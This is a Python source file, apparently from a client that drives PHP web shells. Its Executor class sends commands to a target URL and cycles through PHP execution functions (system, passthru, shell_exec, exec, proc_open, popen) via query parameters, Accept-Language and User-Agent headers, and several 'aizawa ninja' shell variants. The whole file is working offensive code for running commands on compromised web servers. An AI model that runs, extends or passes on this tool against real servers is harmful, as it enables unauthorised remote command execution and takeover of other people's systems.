import sys
import httpx
import asyncio
from modules.http import HttpRequest, HttpMethods
from modules.utilities import YELLOW, RED, CLEAR, BOLD, Headers


class Executor:
    @staticmethod
    async def execute_http_request_get(client, url, cmd, method, request_func):
        result = await request_func(client, url + method, cmd)
        if result:
            return result
        return None

    @staticmethod
    async def execute_http_request_post(client, url, cmd, method, request_func):
        result = await request_func(client, url, method, cmd)
        if result:
            return result
        return None

    @staticmethod
    async def execute(client, url, cmd, type):
        if type == "ping":
            try:
                headers = Headers.create()
                r = await client.get(url, headers=headers, follow_redirects=True)
                if r.status_code != 200:
                    sys.exit(
                        print(
                            f"{BOLD}{YELLOW}WARNING!{CLEAR}\n{RED}ERROR{CLEAR}: Invalid HTTP response code\nPlease check the URL and try again\n"
                        )
                    )
            except httpx.RequestError as e:
                sys.exit(
                    print(
                        f"{BOLD}{YELLOW}WARNING!{CLEAR}\n{RED}ERROR{CLEAR}: URL is not reachable\nPlease check the URL and try again\n"
                    )
                )

        if type in ["get", "post"]:
            headers = Headers.create()
            if type == "get":
                r = await HttpRequest.request(client, "get", url + cmd, headers)
                if r:
                    return r
                return RED + "ERROR" + CLEAR
            elif type == "post":
                r = await client.post(url, headers=headers, data=cmd)
                if r.text:
                    return r.text
                return RED + "ERROR" + CLEAR

        if type in [
            "http_aizawa_ninja_eval",
            "http_aizawa_ninja_concat",
            "http_aizawa_ninja_debug",
            "http_aizawa_ninja_gc",
            "http_aizawa_ninja_json",
            "http_aizawa_ninja_filter",
        ]:
            methods = ["system~", "passthru~", "shell_exec~", "exec~"]
            if type == "http_aizawa_ninja_eval":
                for method in methods:
                    result = await HttpMethods.http_aizawa_ninja(
                        client, url, method + cmd
                    )
                    if result:
                        return result
                return RED + "ERROR" + CLEAR
            else:
                result = await HttpMethods.http_aizawa_ninja(client, url, cmd)
                if result:
                    return result
                return RED + "ERROR" + CLEAR

        if type in ["http_accept_language_get", "http_user_agent_get"]:
            methods = [
                "?cmd=system",
                "?cmd=proc_open",
                "?cmd=popen",
                "?cmd=passthru",
                "?cmd=shell_exec",
                "?cmd=exec",
            ]
            request_func = (
                HttpMethods.http_accept_language_get
                if type == "http_accept_language_get"
                else HttpMethods.http_user_agent_get
            )
            tasks = [
                Executor.execute_http_request_get(
                    client, url, cmd, method, request_func
                )
                for method in methods
            ]
            results = await asyncio.gather(*tasks)
            for result in results:
                if result:
                    return result
            return RED + "ERROR" + CLEAR

        if type in ["http_accept_language_post", "http_user_agent_post"]:
            methods = ["system", "proc_open", "popen", "passthru", "shell_exec", "exec"]
            request_func = (
                HttpMethods.http_accept_language_post
                if type == "http_accept_language_post"
                else HttpMethods.http_user_agent_post
            )
            tasks = [
                Executor.execute_http_request_post(
                    client, url, cmd, method, request_func
                )
                for method in methods
            ]
            results = await asyncio.gather(*tasks)
            for result in results:
                if result:
                    return result
            return RED + "ERROR" + CLEAR
